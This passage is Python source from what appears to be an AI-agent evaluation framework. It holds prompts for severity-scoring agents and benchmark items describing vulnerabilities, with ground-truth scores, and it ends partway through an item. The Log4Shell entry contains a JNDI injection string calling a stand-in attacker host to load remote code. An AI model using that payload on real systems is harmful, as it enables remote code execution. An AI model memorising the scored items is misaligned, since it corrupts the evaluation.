"""Cybersecurity vulnerability assessment domain.

Second domain implementation. Proves the verification framework is domain-agnostic.
Agents assess severity of security vulnerabilities/incidents on a 0-100 scale.
"""

from .base import Domain, EvalItem, Scenario, TrapItem


class CyberSecDomain(Domain):
    """Cybersecurity vulnerability severity assessment."""

    @property
    def name(self) -> str:
        return "CyberSec:vulnerability-assessment"

    @property
    def category(self) -> str:
        return "CyberSec"

    @property
    def subcategory(self) -> str:
        return "vulnerability-assessment"

    def get_all_items(self) -> list[EvalItem]:
        return VULNERABILITIES

    def get_scenarios(self) -> list[Scenario]:
        return SCENARIOS

    def get_trap_items(self) -> list[TrapItem]:
        return TRAP_VULNS

    def get_assessment_system_prompt(self, memory: str = "") -> str:
        base = (
            "You are a cybersecurity vulnerability assessment agent. Your job is to evaluate "
            "security vulnerabilities and assign a severity score from 0 (no impact) to 100 "
            "(catastrophic). Consider: attack vector complexity, authentication requirements, "
            "scope of impact, data sensitivity, exploitability, patch availability, "
            "active exploitation in the wild, and affected system criticality. "
            'Respond with JSON: {"score": <0-100>, "reasoning": "...", '
            '"red_flags": [...], "confidence": "low/medium/high"}'
        )
        if memory:
            base += f"\n\nYour accumulated experience and knowledge:\n{memory}"
        return base

    def get_sanitized_export_prompt(self, accumulated_memory: list[str]) -> str:
        memory_text = "\n\n".join(accumulated_memory)
        return (
            "You are a cybersecurity vulnerability assessment agent with 20 rounds of experience. "
            "Based on everything you've learned, create a comprehensive memory artifact "
            "that another agent could use to immediately perform at your level.\n\n"
            "CRITICAL RESTRICTIONS — ABLATION MODE:\n"
            "- Do NOT include any specific vulnerability names or CVE IDs from your training\n"
            "- Do NOT include exact scores you assigned to any specific vulnerability\n"
            "- Do NOT include a scoring guide that maps vulnerability names to numbers\n"
            "- Do NOT reference specific mistakes by vulnerability name\n"
            "- Instead, express everything as GENERALIZABLE PRINCIPLES, FRAMEWORKS, and CATEGORIES\n"
            "- Use hypothetical examples ('an RCE vulnerability with X properties') not named ones\n"
            "- Express calibration as ranges and rules, not as a lookup table\n\n"
            "The goal is to transfer your JUDGMENT and CALIBRATION FRAMEWORK, not your answer key.\n\n"
            "Structure your output with these sections:\n"
            "1. CALIBRATION — Numerical scoring frameworks with point modifiers by severity factor CATEGORY\n"
            "2. RED FLAGS — Critical, major, and warning-level patterns described generically\n"
            "3. MITIGANTS — Severity reduction factors ranked by impact with point values\n"
            "4. HEURISTICS — Quick decision rules by vulnerability TYPE with starting score ranges\n"
            "5. MISTAKES TO AVOID — Common calibration errors described as PATTERNS, not specific cases\n\n"
            f"Your accumulated experience:\n{memory_text}"
        )

    def get_buyer_system_prompt(self, artifact_content: str) -> str:
        return (
            "You are a cybersecurity vulnerability assessment agent. Your job is to evaluate "
            "security vulnerabilities and assign a severity score from 0 (no impact) to 100 "
            "(catastrophic). Consider: attack vector complexity, authentication requirements, "
            "scope of impact, data sensitivity, exploitability, patch availability, "
            "active exploitation in the wild, and affected system criticality. "
            'Respond with JSON: {"score": <0-100>, "reasoning": "...", '
            '"red_flags": [...], "confidence": "low/medium/high"}\n\n'
            "You have no direct experience, but you have acquired a memory artifact "
            "from an experienced agent. Use this knowledge to inform your assessments:\n\n"
            "--- MEMORY ARTIFACT (purchased from experienced agent) ---\n"
            f"{artifact_content}\n"
            "--- END MEMORY ARTIFACT ---\n\n"
            "Apply the knowledge from this memory artifact to your assessments."
        )

    def get_assessment_user_prompt(self, item: EvalItem) -> str:
        return f"Assess the severity of this security vulnerability:\n\n{item.description}"

    def get_export_prompt(self, accumulated_memory: list[str]) -> str:
        memory_text = "\n\n".join(accumulated_memory)
        return (
            "You are a cybersecurity vulnerability assessment agent with 20 rounds of experience. "
            "Based on everything you've learned, create a comprehensive memory artifact "
            "that another agent could use to immediately perform at your level.\n\n"
            "CRITICAL INSTRUCTIONS FOR THE ARTIFACT:\n"
            "- Be SPECIFIC. Use exact vulnerability names from your experience (HeartbleedDB, CloudLeak, etc.) as examples.\n"
            "- Include EXACT numerical modifiers (e.g., 'Remote code execution without auth: +25-30 points').\n"
            "- Reference SPECIFIC mistakes you made and what the correct scores were.\n"
            "- In the SCORING GUIDE, give the EXACT scores for vulns you assessed (e.g., 'SQLi-Legacy: 72').\n"
            "- In HEURISTICS, give concrete starting points (e.g., 'RCE vulns: Start at 75').\n"
            "- This artifact will be injected into another agent's system prompt. "
            "The more specific and calibrated your numbers, the better it will transfer.\n\n"
            "Structure your output with these sections:\n"
            "1. CALIBRATION — Numerical scoring frameworks with EXACT point modifiers by severity factor\n"
            "2. RED FLAGS — Critical, major, and warning-level patterns with SPECIFIC examples\n"
            "3. MITIGANTS — Severity reduction factors ranked by impact with EXACT point values\n"
            "4. HEURISTICS — Quick decision rules by vulnerability type with STARTING SCORES\n"
            "5. MISTAKES TO AVOID — SPECIFIC errors you made, what you scored vs the true score\n"
            "6. SCORING GUIDE — EXACT scores for each vulnerability you assessed with reasoning\n\n"
            f"Your accumulated experience:\n{memory_text}"
        )

    def get_scenario_system_prompt(self, memory: str = "") -> str:
        base = (
            "You are a cybersecurity vulnerability assessment agent learning through scenarios. "
            "For each scenario, provide your original severity score, how the scenario "
            "changes your assessment, and your updated score. "
            'Respond with JSON: {"original_score": <0-100>, "updated_score": <0-100>, '
            '"reasoning": "...", "lesson": "..."}'
        )
        if memory:
            base += f"\n\nYour accumulated experience:\n{memory}"
        return base


# ============================================================================
# VULNERABILITIES — 24 security vulnerabilities with ground truth severity
# Original synthetic (8): HeartbleedDB, CloudLeak, SQLi-Legacy, PrivEsc-Container,
#   XSS-Stored, APIKeyExposure, FirmwareRCE, DNSRebind
# Real-CVE-based (16): Log4Shell, MOVEitTransfer, ProxyShell, SpringShell,
#   CitrixBleed, ApachePathTraversal, SolarWindsOrion, PrintNightmare,
#   Follina, ESXiOpenSLP, GoAnywhereMFT, PaperCutNG,
#   ZerologonAD, FortiGateSSLVPN, AtlassianConfluence, F5BigIP
# ============================================================================

VULNERABILITIES = [
    EvalItem(
        name="HeartbleedDB",
        category="Memory Disclosure",
        true_score=82,
        is_training=True,
        description=(
            "HeartbleedDB — Database Memory Disclosure\n"
            "Affected System: Production database cluster (PostgreSQL 14) serving 2.3M users\n"
            "Attack Vector: Network-accessible, no authentication required\n"
            "Vulnerability: Buffer over-read in custom connection pooler leaks up to 64KB of "
            "adjacent heap memory per request, including cleartext credentials and session tokens\n"
            "Scope: Any network client can trigger; affects all 3 database replicas\n"
            "Data at Risk: User credentials (hashed, but session tokens cleartext), PII, financial records\n"
            "Exploitability: PoC published on GitHub, trivial to exploit, no special tools needed\n"
            "Active Exploitation: Honeypot detected 340 unique IPs probing in last 48 hours\n"
            "Patch: Vendor patch available but requires 4-hour maintenance window\n"
            "Workaround: Rate limiting reduces but does not eliminate risk"
        ),
        risk_factors=["no auth required", "public PoC", "active exploitation", "cleartext session tokens", "PII exposure", "2.3M users affected"],
        mitigants=["patch available", "rate limiting partially effective", "passwords are hashed"],
    ),
    EvalItem(
        name="CloudLeak",
        category="Cloud Misconfiguration",
        true_score=45,
        is_training=True,
        description=(
            "CloudLeak — S3 Bucket Public Access\n"
            "Affected System: AWS S3 bucket containing application logs and non-production backups\n"
            "Attack Vector: Public internet, bucket policy allows s3:GetObject to *\n"
            "Vulnerability: Misconfigured bucket policy grants public read access\n"
            "Scope: Single bucket, non-production environment\n"
            "Data at Risk: Application debug logs (contain stack traces, internal IPs, some API keys "
            "from 6 months ago that have since been rotated), development database snapshots\n"
            "Exploitability: Trivial — direct URL access, automated scanners find these daily\n"
            "Active Exploitation: No evidence of access by unauthorized parties (CloudTrail reviewed)\n"
            "Patch: Bucket policy update, 5-minute fix\n"
            "Workaround: Temporary bucket block public access"
        ),
        risk_factors=["public access", "trivial exploitation", "API keys in logs (rotated)", "internal IPs exposed"],
        mitigants=["non-production data", "no active exploitation", "API keys rotated", "instant fix available", "limited scope"],
    ),
    EvalItem(
        name="SQLi-Legacy",
        category="SQL Injection",
        true_score=72,
        is_training=True,
        description=(
            "SQLi-Legacy — SQL Injection in Legacy Admin Panel\n"
            "Affected System: Internal admin panel (PHP 5.6) used by 15 operations staff\n"
            "Attack Vector: Requires VPN access + valid employee credentials\n"
            "Vulnerability: Unsanitized user input in search query allows UNION-based SQL injection. "
            "Attacker with valid creds can extract full database contents including user PII\n"
            "Scope: Admin panel only, but database contains all 800K customer records\n"
            "Data at Risk: Full customer database — names, emails, addresses, order history, "
            "hashed passwords (MD5, no salt)\n"
            "Exploitability: Standard SQLi techniques, sqlmap works out of the box\n"
            "Active Exploitation: No evidence, but no logging on the admin panel either\n"
            "Patch: Requires rewrite of search module; PHP 5.6 is EOL\n"
            "Workaround: WAF rule blocks UNION keyword in search parameter"
        ),
        risk_factors=["full database access", "800K customer records", "MD5 unsalted passwords", "PHP 5.6 EOL", "no logging", "sqlmap-trivial"],
        mitigants=["VPN + auth required", "WAF workaround available", "internal-facing only", "limited user base (15 staff)"],
    ),
    EvalItem(
        name="PrivEsc-Container",
        category="Privilege Escalation",
        true_score=58,
        is_training=True,
        description=(
            "PrivEsc-Container — Container Escape via Privileged Mode\n"
            "Affected System: Kubernetes cluster running 40 microservices, 3 nodes\n"
            "Attack Vector: Requires initial foothold inside any container (e.g., via application vuln)\n"
            "Vulnerability: 6 containers run in privileged mode (--privileged flag), allowing escape "
            "to host node. From node, lateral movement to other containers and cloud metadata endpoint\n"
            "Scope: Compromised container → host node → other containers → cloud IAM role\n"
            "Data at Risk: Cloud provider credentials via metadata endpoint, secrets in other containers, "
            "source code, database connection strings\n"
            "Exploitability: Well-documented techniques, but requires initial container compromise first\n"
            "Active Exploitation: No evidence\n"
            "Patch: Remove privileged mode, implement PodSecurityPolicies\n"
            "Workaround: Network policies to block metadata endpoint access"
        ),
        risk_factors=["container escape possible", "cloud IAM via metadata", "lateral movement", "6 privileged containers", "secrets accessible"],
        mitigants=["requires initial foothold first", "no active exploitation", "fix available (remove privileged)", "network policy workaround"],
    ),
    EvalItem(
        name="XSS-Stored",
        category="Cross-Site Scripting",
        true_score=35,
        is_training=True,
        description=(
            "XSS-Stored — Stored XSS in User Profile Bio\n"
            "Affected System: SaaS platform user profile pages, 45K active users\n"
            "Attack Vector: Authenticated user can inject JavaScript via profile bio field\n"
            "Vulnerability: Bio field accepts HTML without sanitization. Injected script executes "
            "when any user views the attacker's profile. Can steal session cookies (HttpOnly not set)\n"
            "Scope: Any user who views the malicious profile; cookie theft enables session hijacking\n"
            "Data at Risk: Session tokens, user can impersonate victim within the platform\n"
            "Exploitability: Simple payload injection, but attacker must get victims to view their profile\n"
            "Active Exploitation: No reports, bug bounty submission\n"
            "Patch: Input sanitization + Content-Security-Policy header, 2-day development effort\n"
            "Workaround: Set HttpOnly flag on session cookies (1-hour fix, blocks cookie theft)"
        ),
        risk_factors=["stored XSS", "session hijacking possible", "HttpOnly not set", "45K users potentially affected"],
        mitigants=["requires user interaction (view profile)", "no active exploitation", "quick HttpOnly fix available", "bug bounty (responsible disclosure)", "limited to session hijacking (not data exfil)"],
    ),
    # --- Held-out protocols ---
    EvalItem(
        name="APIKeyExposure",
        category="Credential Exposure",
        true_score=68,
        is_training=False,
        description=(
            "APIKeyExposure — Production API Keys in Public GitHub Repo\n"
            "Affected System: Payment processing service API keys (Stripe live keys)\n"
            "Attack Vector: Public GitHub repository, commit from 3 days ago\n"
            "Vulnerability: Developer committed .env file containing Stripe live secret key, "
            "database connection string (RDS), and SendGrid API key\n"
            "Scope: Stripe key allows charging any amount, issuing refunds, accessing customer payment data. "
            "DB string gives read/write to production database\n"
            "Data at Risk: Payment card tokens (not raw card numbers — Stripe-tokenized), customer emails, "
            "order data, full database write access\n"
            "Exploitability: Bots scan GitHub for exposed keys within minutes of commit\n"
            "Active Exploitation: Unknown — no monitoring on the Stripe account for anomalous charges\n"
            "Patch: Rotate all three keys immediately (~30 min), BFG to clean git history\n"
            "Workaround: None effective — keys must be rotated"
        ),
        risk_factors=["Stripe live keys exposed", "production DB access", "public for 3 days", "bots scan for these instantly", "no anomaly monitoring"],
        mitigants=["cards are tokenized (not raw numbers)", "keys can be rotated quickly", "no confirmed exploitation yet"],
    ),
    EvalItem(
        name="FirmwareRCE",
        category="Remote Code Execution",
        true_score=90,
        is_training=False,
        description=(
            "FirmwareRCE — Unauthenticated RCE in Network Gateway Firmware\n"
            "Affected System: Edge network gateway appliances (4,200 deployed units across 800 sites)\n"
            "Attack Vector: Network-accessible management interface, no authentication required\n"
            "Vulnerability: Buffer overflow in HTTP request handler allows arbitrary code execution "
            "as root. Attacker gains full control of the gateway appliance\n"
            "Scope: Each gateway routes all traffic for its site — attacker can intercept, modify, "
            "or redirect all network traffic. Can pivot to internal network\n"
            "Data at Risk: All network traffic passing through the gateway (potentially including "
            "credentials, sensitive data). Internal network access from each compromised site\n"
            "Exploitability: PoC exploit published by security researcher, weaponized version on exploit forums\n"
            "Active Exploitation: CISA emergency directive issued, multiple confirmed compromises in wild\n"
            "Patch: Firmware update available but requires physical access or trusted network path\n"
            "Workaround: Disable management interface (breaks remote management)"
        ),
        risk_factors=["unauthenticated RCE", "root access", "4200 units affected", "weaponized exploit", "CISA directive", "traffic interception", "active exploitation confirmed"],
        mitigants=["patch available (but hard to deploy)", "workaround exists (with trade-off)"],
    ),
    EvalItem(
        name="DNSRebind",
        category="DNS Rebinding",
        true_score=28,
        is_training=False,
        description=(
            "DNSRebind — DNS Rebinding Attack on Internal Development Tool\n"
            "Affected System: Internal development dashboard (React app) running on developer laptops\n"
            "Attack Vector: Victim must visit attacker-controlled website while dev dashboard is running\n"
            "Vulnerability: Dashboard binds to 0.0.0.0:3000 without CORS restrictions. DNS rebinding "
            "allows external website to make requests to localhost:3000 and read responses\n"
            "Scope: Attacker can read data from the dashboard API — build statuses, deployment logs, "
            "environment variable names (not values)\n"
            "Data at Risk: Build metadata, deployment timestamps, service names, environment variable keys. "
            "No secrets, credentials, or customer data accessible via the API\n"
            "Exploitability: Requires sophisticated attack (DNS rebinding), victim must actively browse "
            "attacker site, dashboard must be running simultaneously\n"
            "Active Exploitation: No reports\n"
            "Patch: Bind to 127.0.0.1 instead of 0.0.0.0, add Host header validation. 1-line fix\n"
            "Workaround: Developers can manually bind to 127.0.0.1 in config"
        ),
        risk_factors=["no CORS restrictions", "binds to 0.0.0.0"],
        mitigants=["no sensitive data exposed", "sophisticated attack required", "requires victim interaction", "internal tool only", "1-line fix", "no active exploitation", "metadata only (no secrets)"],
    ),
    # --- Real-CVE-based vulnerabilities ---
    EvalItem(
        name="Log4Shell",
        category="Remote Code Execution",
        true_score=95,
        is_training=True,
        description=(
            "Log4Shell — CVE-2021-44228 (CVSS 10.0)\n"
            "Affected System: Apache Log4j 2.x logging library, embedded in thousands of Java applications\n"
            "Attack Vector: Network-accessible, no authentication required. Attacker sends crafted "
            "string (e.g., ${jndi:ldap://attacker.com/exploit}) in any logged field — HTTP headers, "
            "form inputs, user-agent strings, chat messages\n"
            "Vulnerability: JNDI lookup feature in Log4j allows arbitrary remote class loading. "
            "Attacker hosts malicious Java class on LDAP/RMI server, victim application fetches and executes it\n"
            "Scope: Any Java application using Log4j 2.0-beta9 through 2.14.1 — estimated 35,000+ packages, "
            "including Apache Struts, Solr, Druid, Flink, and major enterprise software\n"
            "Data at Risk: Full system compromise — RCE as the application user, lateral movement, "
            "data exfiltration, ransomware deployment\n"
            "Exploitability: Trivial — single string injection, automated scanners deployed within hours "
            "of disclosure. Exploit kits available immediately\n"
            "Active Exploitation: Massive — CISA, NCSC, and multiple CERTs confirmed widespread exploitation "
            "within 24 hours of disclosure. Used by nation-state actors and ransomware groups\n"
            "Patch: Upgrade to Log4j 2.17.0+. Multiple partial fixes in 2.15.0 and 2.16.0 were bypassed\n"
            "Workaround: Set log4j2.formatMsgNoLookups=true (partial, bypassed in some configurations)"
        ),
        risk_factors=["CVSS 10.0", "trivial exploitation", "massive attack surface (35K+ packages)", "active nation-state exploitation", "partial patches bypassed", "no auth required", "full RCE"],
        mitigants=["patch available (but deployment is complex due to library embedding)", "workaround exists (partial)"],
    ),
    EvalItem(
        name="MOVEitTransfer",
        category="SQL Injection / RCE",
        true_score=88,
        is_training=True,
        description=(
            "MOVEit Transfer — CVE-2023-34362 (CVSS 9.8)\n"
            "Affected System: Progress MOVEit Transfer managed file transfer application, "
            "used by ~2,500 organizations for regulated data exchange\n"
            "Attack Vector: Network-accessible web interface, no authentication required\n"
            "Vulnerability: SQL injection in web application allows unauthenticated attacker to "
            "access the database and execute arbitrary code via xp_cmdshell\n"
            "Scope: All MOVEit Transfer versions before patched release. The Clop ransomware gang "
            "exploited this to breach 2,000+ organizations and steal data on 60M+ individuals\n"
            "Data at Risk: All files stored in MOVEit Transfer — typically PII, PHI, financial data, "
            "legal documents. Downstream impact across healthcare, government, financial services\n"
            "Exploitability: Automated — Clop deployed mass exploitation scripts\n"
            "Active Exploitation: Confirmed mass exploitation by Clop ransomware gang starting May 2023\n"
            "Patch: Emergency patch released by Progress Software\n"
            "Workaround: Disable HTTP/HTTPS traffic to MOVEit Transfer (breaks functionality)"
        ),
        risk_factors=["CVSS 9.8", "mass exploitation by ransomware gang", "60M+ individuals affected", "no auth required", "sensitive regulated data", "automated exploitation"],
        mitigants=["patch available", "workaround available (with functionality loss)"],
    ),
    EvalItem(
        name="ProxyShell",
        category="Remote Code Execution",
        true_score=85,
        is_training=True,
        description=(
            "ProxyShell — CVE-2021-34473/34523/31207 (CVSS 9.8/9.8/7.2)\n"
            "Affected System: Microsoft Exchange Server (on-premises), all supported versions\n"
            "Attack Vector: Network-accessible, pre-authentication for initial access\n"
            "Vulnerability: Chain of three vulnerabilities: (1) pre-auth SSRF bypasses access control, "
            "(2) privilege escalation to Exchange admin, (3) arbitrary file write achieves RCE via webshell\n"
            "Scope: All on-premises Exchange servers exposed to internet — estimated 400,000+ servers\n"
            "Data at Risk: Full email contents, Active Directory credentials, lateral movement to "
            "domain controller, complete network compromise\n"
            "Exploitability: Public exploits available, automated scanning widespread\n"
            "Active Exploitation: Widely exploited by APT groups and ransomware operators. "
            "CISA emergency directive issued\n"
            "Patch: Available in April/May 2021 security updates\n"
            "Workaround: Restrict external access to Exchange OWA/ECP"
        ),
        risk_factors=["CVSS 9.8", "pre-auth RCE chain", "400K+ exposed servers", "APT exploitation", "full domain compromise possible", "CISA emergency directive"],
        mitigants=["patch available", "workaround possible", "cloud Exchange (365) not affected"],
    ),
    EvalItem(
        name="SpringShell",
        category="Remote Code Execution",
        true_score=62,
        is_training=True,
        description=(
            "Spring4Shell — CVE-2022-22965 (CVSS 9.8)\n"
            "Affected System: Spring Framework 5.3.0-5.3.17 and 5.2.0-5.2.19 running on JDK 9+\n"
            "Attack Vector: Network-accessible, no authentication required\n"
            "Vulnerability: Class loader manipulation via data binding allows attacker to modify "
            "Tomcat logging properties and write a webshell to disk\n"
            "Scope: Only affects applications using Spring MVC or WebFlux with specific configurations — "
            "WAR deployment on Tomcat, JDK 9+. Many Spring Boot applications (JAR deployment) are NOT affected\n"
            "Data at Risk: Full server compromise if exploitable, but limited blast radius due to "
            "narrow preconditions\n"
            "Exploitability: PoC available, but exploitation requires specific deployment conditions "
            "that many production setups don't meet\n"
            "Active Exploitation: Limited — some scanning observed but far less than Log4Shell\n"
            "Patch: Spring Framework 5.3.18+ and 5.2.20+\n"
            "Workaround: Downgrade to JDK 8, or apply DataBinder restrictions"
        ),
        risk_factors=["CVSS 9.8", "RCE", "no auth required", "PoC available"],
        mitigants=["narrow preconditions (WAR+Tomcat+JDK9+)", "many deployments not affected", "limited active exploitation", "patch available", "multiple workarounds", "overhyped relative to actual impact"],
    ),
    EvalItem(
        name="CitrixBleed",
        category="Information Disclosure / Session Hijack",
        true_score=83,
        is_training=True,
        description=(
            "CitrixBleed — CVE-2023-4966 (CVSS 9.4)\n"
            "Affected System: Citrix NetScaler ADC and Gateway (formerly Citrix ADC)\n"
            "Attack Vector: Network-accessible, no authentication required\n"
            "Vulnerability: Buffer overflow in HTTP/2 handling leaks session tokens from memory. "
            "Attacker can hijack authenticated sessions without credentials\n"
            "Scope: All NetScaler ADC/Gateway appliances configured as VPN virtual server, "
            "ICA proxy, RDP proxy, or AAA virtual server. Estimated 20,000+ exposed instances\n"
            "Data at Risk: Full session hijack — attacker inherits all permissions of the hijacked user. "
            "Often used to access corporate networks, VDI sessions, and internal applications\n"
            "Exploitability: Trivial — PoC scripts extract session tokens in seconds\n"
            "Active Exploitation: Exploited by LockBit ransomware and multiple APT groups. "
            "Compromised Boeing, ICBC, Allen & Overy\n"
            "Patch: Available from Citrix. Sessions must be invalidated after patching\n"
            "Workaround: None effective — must patch and rotate all sessions"
        ),
        risk_factors=["CVSS 9.4", "trivial exploitation", "session hijack without credentials", "ransomware exploitation (LockBit)", "major enterprise victims", "sessions persist after patching unless rotated"],
        mitigants=["patch available", "limited to specific configurations"],
    ),
    EvalItem(
        name="ApachePathTraversal",
        category="Path Traversal / RCE",
        true_score=52,
        is_training=True,
        description=(
            "Apache Path Traversal — CVE-2021-41773 (CVSS 7.5)\n"
            "Affected System: Apache HTTP Server 2.4.49 only (single version affected)\n"
            "Attack Vector: Network-accessible, no authentication required\n"
            "Vulnerability: Path normalization flaw allows directory traversal using URL-encoded "
            "dot-dot-slash sequences. If mod_cgi is enabled, achieves remote code execution\n"
            "Scope: Only Apache 2.4.49 with 'Require all granted' on non-default directory. "
            "A follow-up CVE-2021-42013 affected 2.4.50 as well (incomplete fix)\n"
            "Data at Risk: Arbitrary file read (e.g., /etc/passwd). RCE if mod_cgi enabled\n"
            "Exploitability: Trivial path traversal, PoC is a single curl command\n"
            "Active Exploitation: Some scanning observed, limited confirmed compromises\n"
            "Patch: Upgrade to Apache 2.4.51+\n"
            "Workaround: Ensure 'Require all denied' is default, disable mod_cgi if unused"
        ),
        risk_factors=["no auth required", "trivial exploitation", "RCE possible with mod_cgi", "incomplete first patch"],
        mitigants=["single version affected (2.4.49)", "narrow configuration requirement", "limited active exploitation", "easy patch", "file read only without mod_cgi"],
    ),
    EvalItem(
        name="SolarWindsOrion",
        category="Supply Chain Compromise",
        true_score=92,
        is_training=True,
        description=(
            "SolarWinds SUNBURST — CVE-2020-10148 (CVSS 9.8)\n"
            "Affected System: SolarWinds Orion Platform versions 2019.4 through 2020.2.1\n"
            "Attack Vector: Supply chain — malicious code inserted into legitimate software update, "
            "distributed to ~18,000 organizations via official SolarWinds update channel\n"
            "Vulnerability: Trojanized DLL (SolarWinds.Orion.Core.BusinessLayer.dll) contains "
            "backdoor that communicates with attacker C2 via DNS, blends with legitimate Orion traffic\n"
            "Scope: 18,000 organizations installed the trojanized update. ~100 were actively exploited "
            "including US Treasury, Commerce, DHS, FireEye, Microsoft, Intel\n"
            "Data at Risk: Full network compromise — the backdoor provides arbitrary command execution, "
            "file transfer, registry manipulation, and service management\n"
            "Exploitability: Automated via supply chain — victims installed the backdoor themselves\n"
            "Active Exploitation: Confirmed APT29 (Russian SVR) operation, active for ~9 months before discovery\n"
            "Patch: SolarWinds Orion 2020.2.1 HF 2+. Also requires full incident response\n"
            "Workaround: Isolate or disconnect Orion servers, rotate all credentials"
        ),
        risk_factors=["supply chain attack (highest severity category)", "nation-state APT29", "9 months undetected", "18,000 orgs affected", "full network compromise", "government targets"],
        mitigants=["patch available", "only ~100 of 18K actively exploited", "detection signatures now available"],
    ),
    EvalItem(
        name="PrintNightmare",
        category="Remote Code Execution",
        true_score=70,
        is_training=True,
        description=(
            "PrintNightmare — CVE-2021-34527 (CVSS 8.8)\n"
            "Affected System: Windows Print Spooler service on all Windows versions\n"
            "Attack Vector: Network-accessible with low-privilege credentials (any domain user)\n"
            "Vulnerability: Improper privilege check in Print Spooler allows authenticated user to "
            "install malicious printer drivers, achieving SYSTEM-level code execution on domain controllers\n"
            "Scope: Every Windows machine running Print Spooler (enabled by default). "
            "Particularly critical on domain controllers where SYSTEM = domain admin\n"
            "Data at Risk: Full domain compromise if exploited on a domain controller. "
            "SYSTEM access on individual hosts\n"
            "Exploitability: Public exploits available, requires only any valid domain credential\n"
            "Active Exploitation: Confirmed exploitation in the wild by multiple threat actors\n"
            "Patch: Microsoft released patches but initial patches were incomplete. "
            "Full mitigation required registry changes and group policy updates\n"
            "Workaround: Disable Print Spooler service (breaks printing)"
        ),
        risk_factors=["CVSS 8.8", "affects all Windows", "domain controller compromise", "incomplete patches", "public exploits", "any domain user can exploit"],
        mitigants=["requires valid credentials (not pre-auth)", "patch available (with registry fix)", "can disable Print Spooler"],
    ),
    # --- Real-CVE-based held-out vulnerabilities ---
    EvalItem(
        name="Follina",
        category="Remote Code Execution",
        true_score=72,
        is_training=False,
        description=(
            "Follina — CVE-2022-30190 (CVSS 7.8)\n"
            "Affected System: Microsoft Support Diagnostic Tool (MSDT) via Microsoft Office\n"
            "Attack Vector: User opens a malicious Office document (Word, Excel) or even previews "
            "it in Explorer. No macros needed — exploits ms-msdt: protocol handler\n"
            "Vulnerability: Crafted Office document triggers MSDT URL protocol, which executes "
            "arbitrary PowerShell commands. Works even with macros disabled\n"
            "Scope: All Windows versions with MSDT installed (default). All Office versions\n"
            "Data at Risk: Full user-level compromise, can escalate to SYSTEM in some configurations\n"
            "Exploitability: PoC widely available, weaponized in phishing campaigns. "
            "Bypasses macro security controls\n"
            "Active Exploitation: Used by APT groups (TA570, Chinese APT) and in targeted phishing\n"
            "Patch: Microsoft patch in June 2022 Patch Tuesday\n"
            "Workaround: Disable MSDT URL protocol via registry"
        ),
        risk_factors=["bypasses macro security", "user interaction required (but minimal)", "APT exploitation", "all Windows/Office affected", "phishing delivery vector"],
        mitigants=["requires user to open document", "patch available", "workaround available", "user-level access only (without escalation)"],
    ),
    EvalItem(
        name="ESXiOpenSLP",
        category="Remote Code Execution",
        true_score=80,
        is_training=False,
        description=(
            "ESXi OpenSLP — CVE-2021-21974 (CVSS 8.8)\n"
            "Affected System: VMware ESXi 6.5, 6.7, and 7.0 hypervisors\n"
            "Attack Vector: Network-accessible via port 427 (SLP service), no authentication required\n"
            "Vulnerability: Heap overflow in OpenSLP service allows remote code execution on the ESXi host\n"
            "Scope: Any ESXi host with SLP enabled (default) and port 427 accessible. "
            "Estimated 3,200+ exposed instances when ESXiArgs ransomware campaign launched\n"
            "Data at Risk: All virtual machines on the host — complete VM disk encryption by ransomware, "
            "data exfiltration from all guest VMs\n"
            "Exploitability: Automated — ESXiArgs ransomware campaign mass-exploited this in Feb 2023, "
            "two years after the patch was released\n"
            "Active Exploitation: Mass exploitation by ESXiArgs ransomware. CISA recovery script released\n"
            "Patch: Available since February 2021 (two years before mass exploitation)\n"
            "Workaround: Disable SLP service on ESXi hosts"
        ),
        risk_factors=["hypervisor compromise (all VMs at risk)", "mass ransomware exploitation", "no auth required", "patch available for 2 years but unpatched systems remained", "3200+ exposed"],
        mitigants=["patch available (for 2 years)", "workaround exists (disable SLP)", "CISA recovery tool"],
    ),
    EvalItem(
        name="GoAnywhereMFT",
        category="Remote Code Execution",
        true_score=82,
        is_training=False,
        description=(
            "GoAnywhere MFT — CVE-2023-0669 (CVSS 7.2)\n"
            "Affected System: Fortra GoAnywhere MFT managed file transfer application\n"
            "Attack Vector: Network-accessible admin console (port 8000), requires access to admin interface\n"
            "Vulnerability: Deserialization vulnerability in admin console allows pre-authentication "
            "remote code execution\n"
            "Scope: Organizations using GoAnywhere MFT with admin console exposed. "
            "Clop ransomware gang exploited this to breach 130+ organizations\n"
            "Data at Risk: All files managed by GoAnywhere — typically sensitive business data, "
            "PII, financial records in regulated industries\n"
            "Exploitability: Weaponized by Clop within days of disclosure\n"
            "Active Exploitation: Mass exploitation by Clop ransomware gang, 130+ victims confirmed\n"
            "Patch: Emergency patch from Fortra\n"
            "Workaround: Block access to admin console (port 8000) from internet"
        ),
        risk_factors=["mass exploitation by Clop", "130+ organizations breached", "pre-auth RCE", "file transfer = sensitive data", "deserialization (hard to fully remediate)"],
        mitigants=["admin console exposure required (not default web interface)", "patch available", "port blocking workaround"],
    ),
    EvalItem(
        name="PaperCutNG",
        category="Remote Code Execution",
        true_score=68,
        is_training=False,
        description=(
            "PaperCut NG/MF — CVE-2023-27350 (CVSS 9.8)\n"
            "Affected System: PaperCut NG and PaperCut MF print management servers\n"
            "Attack Vector: Network-accessible, no authentication required\n"
            "Vulnerability: Improper access control allows unauthenticated attacker to leverage "
            "the scripting interface to execute arbitrary code as SYSTEM\n"
            "Scope: PaperCut servers in ~70,000 organizations in 200+ countries. "
            "Primarily education, government, and enterprise\n"
            "Data at Risk: Print job contents, user credentials stored in PaperCut, "
            "SYSTEM-level access to the server. Limited lateral movement from print server\n"
            "Exploitability: Public PoC available, actively exploited by Cl0p and LockBit\n"
            "Active Exploitation: Confirmed by CISA, used by Cl0p and Iranian IRGC-affiliated actors\n"
            "Patch: PaperCut NG/MF 20.1.7+, 21.2.11+, 22.0.9+\n"
            "Workaround: Restrict access to PaperCut server, apply allow-list"
        ),
        risk_factors=["CVSS 9.8", "pre-auth RCE", "ransomware exploitation", "70K orgs use PaperCut", "nation-state exploitation"],
        mitigants=["print server has limited lateral value compared to DC/Exchange", "patch available", "access restriction possible", "lower data sensitivity than file transfer/email"],
    ),
    EvalItem(
        name="ZerologonAD",
        category="Privilege Escalation",
        true_score=90,
        is_training=False,
        description=(
            "Zerologon — CVE-2020-1472 (CVSS 10.0)\n"
            "Affected System: Microsoft Active Directory domain controllers (Netlogon protocol)\n"
            "Attack Vector: Network-accessible from within the network, no authentication required\n"
            "Vulnerability: Cryptographic flaw in Netlogon AES-CFB8 implementation. By sending "
            "Netlogon messages with all-zero initialization vectors, attacker can reset the domain "
            "controller machine account password to empty, then authenticate as the DC\n"
            "Scope: Any Windows Server running as a domain controller. Compromising one DC = "
